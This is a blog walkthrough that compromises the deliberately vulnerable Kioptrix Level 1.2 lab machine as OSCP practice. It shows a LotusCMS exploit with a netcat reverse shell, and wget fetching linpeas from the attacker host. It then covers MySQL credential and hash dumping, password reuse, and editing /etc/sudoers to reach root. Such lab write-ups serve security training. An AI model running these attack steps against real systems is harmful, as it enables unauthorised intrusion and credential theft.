---
title: "Kioptrix Level 1.2"
date: 2020-08-09
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Kioptrix Level 1.2 on VulnHub"
os: "Linux"
platform: "VulnHub"
tags: [OSCP, LotusCMS, mysql, privilege escalation]
comments: false
---

[Kioptrix]( https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) Level 1.2 is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used `netdiscover -i eth0` until I came across the IP of this machine.

![Kioptrix Level 1.3 netdiscover](/images/KioptrixLevel31.png)

Next, I ran `threader3000` and let it run its recommended nmap scan.

![Kioptrix Level 1.2 threader3000 nmap](/images/KioptrixLevel32.png)

It appears that only SSH and HTTP are open.  Let's take a look at the website. It appears that there is a **Login** link on the main page.

![Kioptrix 1.2 Website](/images/KioptrixLevel33.png)

Let's take a look at the login page. This gives us our first hint. This is running **LotusCMS**.

![Kioptrix Level 1.2 LotusCMS login](/images/KioptrixLevel34.png)

I next ran a search on Google and came across the following [exploit](https://github.com/Hood3dRob1n/LotusCMS-Exploit).  This exploit appears to open a reverse shell as the user that is running the CMS. From my attacker PC, I ran `git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit.git`. This will make a copy of the exploit in a directory named **LotusCMS-Exploit**. Run `cd LotusCMS-Exploit` followed by `ls` to list the directory contents.

![Kioptrix Level 1.2 git clone LotusCMS Exploit](/images/KioptrixLevel35.png)

Open up a second terminal windows, and run `nc -nvlp [port number]` where the port number is one of your choosing. This will open a listener to catch the reverse shell.

![Kioptrix Level 1.2 nc reverse shell](/images/KioptrixLevel36.png)

Next, go back to your Lotus CMS exploit terminal window and run `./lotusRCE.sh`. This will explain how to use this exploit.

![Kioptrix Level 1.2 LotusRCE.sh usage](/images/KioptrixLevel37.png)

Now that we know what we should be entering, let's run `./lotusRCE.sh [machine ip] /` . You should be notified that the site is vulnerable to injection and be asked for an IP to use which is `your attacker ip` and a port **the one you specified in your netcat listener**. Next, choose option `1` for the way to connect to your netcat listener.

![Kioptrix Level 1.2 LotusCMS Exploit options](/images/KioptrixLevel38.png)

Once entered, press enter and go to your other terminal window on your attacker pc. You should now have an initial foothold on this box. Let's run `python -c 'import pty; pty.spawn("/bin/sh")'` to create a better shell.

![Kioptrix Level 1.2 initial foothold](/images/KioptrixLevel39.png)

Running **whoami** reveals that you are running as **www-data**. Running `cat /etc/passwd` reveals 2 other nonroot users, **loneferret** and **dreg**.

![Kioptrix Level 1.2 whoami cat /etc/passwd](/images/KioptrixLevel310.png)

I attempted to run `sudo -l` but was prompted for a password. Let's navigate to the tmp directory with  `cd /tmp`. This is typically a world writeable directory that we are going to save linpeas to in order to do further enumeration. On your attacker pc, start an HTTP server with `python3 -m http.server` in a directory you have linpeas saved in.

![Kioptrix Level 1.1 python3 http server](/images/KioptrixLevel311.png)

On the victim terminal window with the initial foothold, let's run `wget http://[attacker ip]:8000/linpeas.sh` followed by `chmod +x linpeas.sh` to make it executable.

![Kioptrix Level 1.2 wget chmod](/images/KioptrixLevel312.png)

Now, run this script with `./linpeas.sh`. This produces a massive amount of output as it appears that it has an old version of metasploit installed on it along with a lot of mysql activity. However, near the very end, we will uncover a password for mysql.

![Kioptrix Level 1.2 mysql password](/images/KioptrixLevel313.png)

Let's try to connect to mysql as root with this wonderfully mature password. To do so, run `mysql -u root -p` and enter **fuckeyou** when prompted for the password.

![Kioptrix Level 1.2 mysql root access](/images/KioptrixLevel314.png)

Success! Let's run `show databases;` to list the databases and select gallery with `use gallery;` Next, let's run `show tables;` and you will notice a table named **dev_accounts**. Let's run `select * from dev_accounts;` and you will see two sets of credentials with hashed passwords for dreg and loneferret.

![Kioptrix Level 1.1 Password Hashes](/images/KioptrixLevel315.png)

I went to [Crackstation](https://crackstation.net) and entered these two hashes, which cracked these md5 hashes. 

![Kioptrix Level 1.1 crack md5 hash Crackstation](/images/KioptrixLevel316.png)

We now have passwords of **Mast3r** for the user **dreg** and **starwars** for the user **loneferret**. Let's run `su loneferret` and enter the password cracked above and see what happens.

![Kioptrix Level 1.2 su loneferret](/images/KioptrixLevel317.png)

Success! It appears that his password was reused. Let's open another terminal windows and run `ssh loneferret@[machine ip]` and enter his password of **starwars** to connect.

![Kioptrix Level 1.2 ssh](/images/KioptrixLevel318.png)

We now have a more proper shell. Let's run `ls -al` to list the contents of loneferret's home directory.

![Kioptrix Level 1.2 ls home directory](/images/KioptrixLevel319.png)

There's a README file in this folder. Let's run `cat CompanyPolicy.README` to take a look at it.

![Kioptrix Level 1.2 cat README](/images/KioptrixLevel320.png)

Let's run `sudo -l` and see if loneferret can run ht with escalated privileges.

![](/images/KioptrixLevel321.png)

It appears that it can be ran without a password as root! It also appears that `s`* could be ran if that line of the file in **/etc/sudoers** could somehow be modified... Let's run `sudo ht` to open up this program.

![Kioptrix Level 1.2 sudo ht error](/images/KioptrixLevel322.png)

Of course it couldn't be that simple. A quick Google search revealed that this error is due to an improper TERM variable value. Let's run `export TERM=xterm` to temporarily set it to xterm instead of xterm-256color.

![Kioptrix Level 1.2 TERM environment variable](/images/KioptrixLevel323.png)

Now, let's try running `sudo ht` again. This will open **ht** which is an editor program of some sort. At the bottom you will notice numbers with commands by them. These are accessed by using the appropriate function key on your keyboard. Let's press **F3** to run the `open` command. 

![Kioptrix Level 1.2 ht editor](/images/KioptrixLevel324.png)

In the box that pops up, enter in **/etc/sudoers** and press enter.

![Kioptrix Level 1.2 ht editor /etc/sudoers](/images/KioptrixLevel325.png)

Success! We were able to open this file for editing due to us running this command as sudo. Let's remove the ! from in front of **/usr/bin/su** and press **F2** to save.

![Kioptrix Level 1.2 ht modify /etc/sudoers](/images/KioptrixLevel326.png)

Next, press **F10** to exit ht, and run `sudo su`. Unfortunately, this does not work.

![Kioptrix Level 1.2 sudo su failure](/images/KioptrixLevel327.png)

This is because **su** is in the **/bin** folder and not the **/usr/bin** folder. I then reran `sudo ht` and pulled up the **/etc/sudoers** file again and modified **/usr/bin/su** to **/bin/su**.

![Kioptrix Level 1.2 ht round 2](/images/KioptrixLevel328.png)

Now once saved (with **F2**), press **F10** to exit back to terminal and run `sudo su` again.	

![Kioptrix Level 1.2 root shell](/images/KioptrixLevel329.png)

Next I ran `cd /root` followed by `ls -al` to list the contents. there is a **Congrats.txt** file here. Let's read it with `cat Congrats.txt`.

![Kioptrix Level 1.2 root flag Congrats.txt](/images/KioptrixLevel330.png)

With that, this box is complete!
